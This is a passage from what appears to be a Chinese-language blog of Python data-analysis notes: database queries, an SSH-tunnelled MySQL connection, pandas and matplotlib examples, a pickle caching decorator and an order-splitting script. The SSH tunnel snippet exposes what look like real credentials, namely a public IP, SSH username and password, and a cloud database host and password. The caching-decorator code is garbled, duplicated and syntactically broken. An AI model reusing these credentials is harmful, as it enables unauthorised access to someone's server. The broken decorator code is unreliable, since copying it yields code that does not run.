class="line"></span><br><span class="line">    cnx = mysql.connector.connect(user=USER, password=PASSWORD,</span><br><span class="line">                                  host=HOST,</span><br><span class="line">                                  database=DB</span><br><span class="line">                                  )</span><br><span class="line"></span><br><span class="line">    cursor = cnx.cursor()</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cursor.fetchall()</span><br></pre></td></tr></table></figure><h3 id="1-2-查询数据"><a href="#1-2-查询数据" class="headerlink" title="1.2 查询数据"></a>1.2 查询数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DRIVE = <span class="string">"mysql+pymysql"</span></span><br><span class="line">USER = <span class="string">"root"</span></span><br><span class="line">PASSWORD = <span class="string">"123456"</span></span><br><span class="line">HOST = <span class="string">"192.168.0.109"</span></span><br><span class="line">PORT = <span class="string">"3306"</span></span><br><span class="line">DATABASE = <span class="string">"guli_edu"</span></span><br><span class="line"></span><br><span class="line">engine=create_engine(<span class="string">f"<span class="subst">&#123;DRIVE&#125;</span>://<span class="subst">&#123;USER&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DATABASE&#125;</span>"</span>)</span><br><span class="line">connect = engine.connect()</span><br><span class="line">sql = <span class="string">"select * from edu_teacher;"</span></span><br><span class="line">result = connect.execute(sql)</span><br><span class="line">df = pd.read_sql(sql, connect)</span><br><span class="line">connect.close()</span><br><span class="line">df</span><br></pre></td></tr></table></figure><h3 id="1-3-python操作需要SSH连接的数据库"><a href="#1-3-python操作需要SSH连接的数据库" class="headerlink" title="1.3 python操作需要SSH连接的数据库"></a>1.3 python操作需要SSH连接的数据库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  pymysql</span><br><span class="line"><span class="keyword">from</span> sshtunnel <span class="keyword">import</span> SSHTunnelForwarder</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> SSHTunnelForwarder(</span><br><span class="line">    (<span class="string">"47.114.164.183"</span>, <span class="number">22</span>), <span class="comment">#ssh IP和port</span></span><br><span class="line">    ssh_password = <span class="string">"uR0Pgp&amp;f"</span>,<span class="comment">#ssh 密码</span></span><br><span class="line">    ssh_username = <span class="string">"xuwei"</span>,<span class="comment">#ssh账号</span></span><br><span class="line">    remote_bind_address = (<span class="string">"rm-bp19or199ue896jkm.mysql.rds.aliyuncs.com"</span>, <span class="number">3306</span>)</span><br><span class="line">) <span class="keyword">as</span> server:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#打印本地端口，已检查是否配置正确</span></span><br><span class="line">    print(server.local_bind_host)</span><br><span class="line"></span><br><span class="line">    goDB = pymysql.connect(host = <span class="string">"127.0.0.1"</span>, <span class="comment">#固定写法</span></span><br><span class="line">                   port = server.local_bind_port,</span><br><span class="line">                   user = <span class="string">"xuwei"</span>, <span class="comment">#数据库账号</span></span><br><span class="line">                   passwd = <span class="string">"o0r$&amp;OYLzo38df^X"</span>,<span class="comment">#数据库密码</span></span><br><span class="line">                    db = <span class="string">"ih"</span>)<span class="comment"># 可以限定，只访问特定的数据库,否则需要在mysql的查询或者操作语句中，指定好表名</span></span><br><span class="line"></span><br><span class="line">    sql = <span class="string">"select * from setting limit 10"</span> <span class="comment">#限制每次随机查询10条数据</span></span><br><span class="line">    cur = goDB.cursor()</span><br><span class="line">    cur.execute(sql)</span><br><span class="line">    data = cur.fetchall()</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">        good_no = row[<span class="number">0</span>]</span><br><span class="line">        print(good_no)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#关闭连接</span></span><br><span class="line">    goDB.close()</span><br></pre></td></tr></table></figure><h1 id="二-常用分析包"><a href="#二-常用分析包" class="headerlink" title="二. 常用分析包"></a>二. 常用分析包</h1><h3 id="2-1-pandas"><a href="#2-1-pandas" class="headerlink" title="2.1 pandas"></a>2.1 pandas</h3><table><thead><tr><th>方法</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>reset_index</td><td>重置索引</td><td>df.drop(index=drop_index).reset_index(drop=True)</td></tr><tr><td>isin</td><td>判断值是否在该列表中</td><td>df.id.isin([1,4])</td></tr><tr><td>sort_values</td><td>按照某一列排序</td><td>df.sort_values([‘name’,’id’])</td></tr><tr><td>drop_duplicates</td><td>去重</td><td># keep = False 有重复就全部去除 <br>df.drop_duplicates(subset = [‘id’],keep = ‘last’,inplace = True ,ignore_index=True)</td></tr><tr><td>sort_values</td><td>排序</td><td>df2.sort_values(by = [‘id’],ignore_index=True)</td></tr><tr><td>merge</td><td>合并</td><td>pd.merge(df1,df2,how = ‘left’,left_on=[‘id’],right_on=[‘id’])</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h5 id="2-1-1-构建dataframe"><a href="#2-1-1-构建dataframe" class="headerlink" title="2.1.1 构建dataframe"></a>2.1.1 构建dataframe</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">test_dict = &#123;<span class="string">'id'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],<span class="string">'name'</span>:[<span class="string">'Alice'</span>,<span class="string">'Bob'</span>,<span class="string">'Cindy'</span>,<span class="string">'Eric'</span>,<span class="string">'Helen'</span>,<span class="string">'Grace '</span>],<span class="string">'math'</span>:[<span class="number">90</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">78</span>,<span class="number">97</span>,<span class="number">93</span>],<span class="string">'english'</span>:[<span class="number">89</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">94</span>,<span class="number">94</span>,<span class="number">90</span>]&#125;</span><br><span class="line"><span class="comment">#[1].直接写入参数test_dict</span></span><br><span class="line">test_dict_df = pd.DataFrame(test_dict)</span><br><span class="line"><span class="comment">#[2].字典型赋值</span></span><br><span class="line">test_dict_df = pd.DataFrame(data=test_dict)</span><br><span class="line"><span class="comment"># 只选择某几列值作为数据</span></span><br><span class="line">test_dict_df = pd.DataFrame(data=test_dict,columns=[<span class="string">'id'</span>,<span class="string">'name'</span>])</span><br></pre></td></tr></table></figure><h5 id="2-1-2-修改列名"><a href="#2-1-2-修改列名" class="headerlink" title="2.1.2 修改列名"></a>2.1.2 修改列名</h5><blockquote><ol><li>覆盖columns，2. rename</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.覆盖</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">test_dict = &#123;<span class="string">'id'</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],<span class="string">'name'</span>:[<span class="string">'Alice'</span>,<span class="string">'Bob'</span>,<span class="string">'Cindy'</span>,<span class="string">'Eric'</span>,<span class="string">'Helen'</span>,<span class="string">'Grace '</span>],<span class="string">'math'</span>:[<span class="number">90</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">78</span>,<span class="number">97</span>,<span class="number">93</span>],<span class="string">'english'</span>:[<span class="number">89</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">94</span>,<span class="number">94</span>,<span class="number">90</span>]&#125;</span><br><span class="line">test_dict_df = pd.DataFrame(data=test_dict,columns=[<span class="string">'id'</span>,<span class="string">'name'</span>])</span><br><span class="line">test_dict_df.columns=[<span class="string">'a'</span>,<span class="string">'B'</span>]</span><br><span class="line"><span class="comment"># 2.rename</span></span><br><span class="line">test_dict_df.rename(columns=&#123;<span class="string">'a'</span>:<span class="string">'id'</span>,<span class="string">'B'</span>:<span class="string">'name'</span>&#125;,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="2-2-numpy"><a href="#2-2-numpy" class="headerlink" title="2.2 numpy"></a>2.2 numpy</h3><h3 id="2-3-matplotlib"><a href="#2-3-matplotlib" class="headerlink" title="2.3 matplotlib"></a>2.3 matplotlib</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"> </span><br><span class="line">x = np.linspace(<span class="number">-1</span>,<span class="number">1</span>,<span class="number">50</span>)<span class="comment">#从(-1,1)均匀取50个点</span></span><br><span class="line">y = <span class="number">2</span> * x</span><br><span class="line"> </span><br><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.ticker <span class="keyword">as</span> ticker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决中文乱码的问题</span></span><br><span class="line">plt.rcParams[<span class="string">'font.sans-serif'</span>] = [<span class="string">'SimHei'</span>]  <span class="comment"># 用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">'axes.unicode_minus'</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br><span class="line"></span><br><span class="line">data = pd.read_csv(<span class="string">"../csvFile/全部订单-小时分1440.csv"</span>)</span><br><span class="line"></span><br><span class="line">tick_xSpacing = <span class="number">200</span></span><br><span class="line">tick_ySpacing = <span class="number">500</span></span><br><span class="line">fig, ax = plt.subplots(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">ax.plot(data.hhmi, data.num, <span class="string">"ob"</span>)</span><br><span class="line"><span class="comment"># 修改横纵坐标的间隔</span></span><br><span class="line">ax.xaxis.set_major_locator(ticker.MultipleLocator(tick_xSpacing))</span><br><span class="line">ax.yaxis.set_major_locator(ticker.MultipleLocator(tick_ySpacing))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置横纵坐标的名称</span></span><br><span class="line">plt.xlabel(<span class="string">"时间"</span>)</span><br><span class="line">plt.ylabel(<span class="string">"订单数"</span>)</span><br><span class="line">plt.title(<span class="string">"x-y"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="十-可复用的方法"><a href="#十-可复用的方法" class="headerlink" title="十. 可复用的方法"></a>十. 可复用的方法</h1><h3 id="10-1-将结果序列化到磁盘，提高开发速率"><a href="#10-1-将结果序列化到磁盘，提高开发速率" class="headerlink" title="10.1 将结果序列化到磁盘，提高开发速率"></a>10.1 将结果序列化到磁盘，提高开发速率</h3><blockquote><p>serial</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># SERIAL_FILE_DIR = os.path.dirname(os.path.realpath(__file__)) + '/serial'</span></span><br><span class="line"></span><br><span class="line">SERIAL_FILE_DIR = os.getcwd() + <span class="string">'/serial/'</span></span><br><span class="line">DUMP_FILE_EXT = <span class="string">'.dump'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(SERIAL_FILE_DIR):</span><br><span class="line">    os.makedirs(SERIAL_FILE_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">import</span> <span class="title">logging</span></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="title">os</span></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="title">pickle</span></span></span><br><span class="line"><span class="function"><span class="title">from</span> <span class="title">functools</span> <span class="title">import</span> <span class="title">wraps</span></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="title">inspect</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"># SERIAL_FILE_DIR = os.path.dirname(os.path.realpath(__file__)) + '/serial'</span><br><span class="line"></span><br><span class="line">SERIAL_FILE_DIR = os.getcwd() + <span class="string">'/serial/'</span></span><br><span class="line">DUMP_FILE_EXT = <span class="string">'.dump'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(SERIAL_FILE_DIR):</span><br><span class="line">    os.makedirs(SERIAL_FILE_DIR)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serial_result</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将函数返回值序列化到磁盘。相同参数直接读取。</span></span><br><span class="line"><span class="string">    :param func:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">        func_filename = inspect.getmodule(func).__file__[</span><br><span class="line">                        inspect.getmodule(func).__file__.rfind(<span class="string">'/'</span>) <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> inspect.getmodule(func).__file__ <span class="keyword">else</span> inspect.getmodule(func).__file__.rfind(<span class="string">'\\'</span>) + <span class="number">1</span>:inspect.getmodule(func).__file__.rfind(<span class="string">'.py'</span>)]</span><br><span class="line">        func_args = func.__name__ + (<span class="string">'.'</span> + str(args) <span class="keyword">if</span> args <span class="keyword">else</span> <span class="string">''</span>) + (<span class="string">'.'</span> + str(kwargs) <span class="keyword">if</span> kwargs <span class="keyword">else</span> <span class="string">''</span>)</span><br><span class="line">        dump_fname = func_filename + DUMP_FILE_EXT</span><br><span class="line">        serial_file = SERIAL_FILE_DIR + dump_fname</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(serial_file):</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is loading results of function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is loading results of function %s '</span> % (func_args,))</span><br><span class="line">            <span class="keyword">with</span> open(serial_file, <span class="string">'rb'</span>) <span class="keyword">as</span> fin:</span><br><span class="line">                <span class="keyword">return</span> pickle.load(fin)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is calling function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is calling function %s '</span> % (func_args,))</span><br><span class="line">            result = func(*args, **kwargs)</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is dumping results of function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is dumping results of function %s '</span> % (func_args,))</span><br><span class="line">            <span class="keyword">with</span> open(serial_file, <span class="string">'wb'</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                pickle.dump(result, fout)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">_result(func):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将函数返回值序列化到磁盘。相同参数直接读取。</span></span><br><span class="line"><span class="string">    :param func:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"><span class="meta">    @wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">        func_filename = inspect.getmodule(func).__file__[</span><br><span class="line">                        inspect.getmodule(func).__file__.rfind(<span class="string">'/'</span>) <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> inspect.getmodule(func).__file__ <span class="keyword">else</span> inspect.getmodule(func).__file__.rfind(<span class="string">'\\'</span>) + <span class="number">1</span>:inspect.getmodule(func).__file__.rfind(<span class="string">'.py'</span>)]</span><br><span class="line">        func_args = func.__name__ + (<span class="string">'.'</span> + str(args) <span class="keyword">if</span> args <span class="keyword">else</span> <span class="string">''</span>) + (<span class="string">'.'</span> + str(kwargs) <span class="keyword">if</span> kwargs <span class="keyword">else</span> <span class="string">''</span>)</span><br><span class="line">        dump_fname = func_filename + DUMP_FILE_EXT</span><br><span class="line">        serial_file = SERIAL_FILE_DIR + dump_fname</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(serial_file):</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is loading results of function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is loading results of function %s '</span> % (func_args,))</span><br><span class="line">            <span class="keyword">with</span> open(serial_file, <span class="string">'rb'</span>) <span class="keyword">as</span> fin:</span><br><span class="line">                <span class="keyword">return</span> pickle.load(fin)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is calling function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is calling function %s '</span> % (func_args,))</span><br><span class="line">            result = func(*args, **kwargs)</span><br><span class="line">            logging.debug(<span class="string">'[serial_result] is dumping results of function %s '</span> % (func_args,))</span><br><span class="line">            print(<span class="string">'[serial_result] is dumping results of function %s '</span> % (func_args,))</span><br><span class="line">            <span class="keyword">with</span> open(serial_file, <span class="string">'wb'</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                pickle.dump(result, fout)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><blockquote><p>db_test</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> serial <span class="keyword">import</span> serial_result</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'localhost'</span></span><br><span class="line">DATABASE = <span class="string">'demo'</span></span><br><span class="line">PASSWORD = <span class="string">'123456'</span></span><br><span class="line">USER = <span class="string">'root'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@serial_result</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data_by_sql</span><span class="params">(sql)</span>:</span></span><br><span class="line">    DRIVE = <span class="string">"mysql+pymysql"</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    engine = create_engine(<span class="string">f"<span class="subst">&#123;DRIVE&#125;</span>://<span class="subst">&#123;USER&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/<span class="subst">&#123;DATABASE&#125;</span>"</span>)</span><br><span class="line">    connect = engine.connect()</span><br><span class="line">    result = connect.execute(sql)</span><br><span class="line">    df = pd.read_sql(sql, connect)</span><br><span class="line">    connect.close()</span><br><span class="line">    <span class="keyword">return</span> df</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sql = <span class="string">'''select * from test'''</span></span><br><span class="line">    res = get_data_by_sql(sql)</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><h3 id="10-2-按曲线分配订单并写入sql文件"><a href="#10-2-按曲线分配订单并写入sql文件" class="headerlink" title="10.2 按曲线分配订单并写入sql文件"></a>10.2 按曲线分配订单并写入sql文件</h3><p><a href="D:\jupyter_folder\first">config.yaml</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> calendar</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_split</span><span class="params">(total, num)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将total随机分配到num。例如：将100个血糖，随机分配给50个用户，使用random_split(100, 50)分配</span></span><br><span class="line"><span class="string">    :param total:</span></span><br><span class="line"><span class="string">    :param num:</span></span><br><span class="line"><span class="string">    :return: 长度为num，总和为total的list</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> num &gt; total:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">            result.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num - total):</span><br><span class="line">            result.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">elif</span> num == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dividers = sorted(random.sample(range(<span class="number">1</span>, total), num - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> [a - b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(dividers + [total], [<span class="number">0</span>] + dividers)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_avg_split</span><span class="params">(total, num, rate=<span class="number">0.8</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将total按照基本平均值随机分配到num</span></span><br><span class="line"><span class="string">    :param total:</span></span><br><span class="line"><span class="string">    :param num:</span></span><br><span class="line"><span class="string">    :param rate: 保底比例，0到1之间。1表示完全平均分配，0表示完全随机分配。</span></span><br><span class="line"><span class="string">    :return: 长度为num，总和为total的list</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    base = int(total / num * rate)  <span class="comment"># 80%分配到每个num中，保证大致平衡</span></span><br><span class="line">    random_result = random_split(total - base * num, num)</span><br><span class="line">    <span class="keyword">return</span> [base + random_result[i] <span class="keyword">for</span> i <span 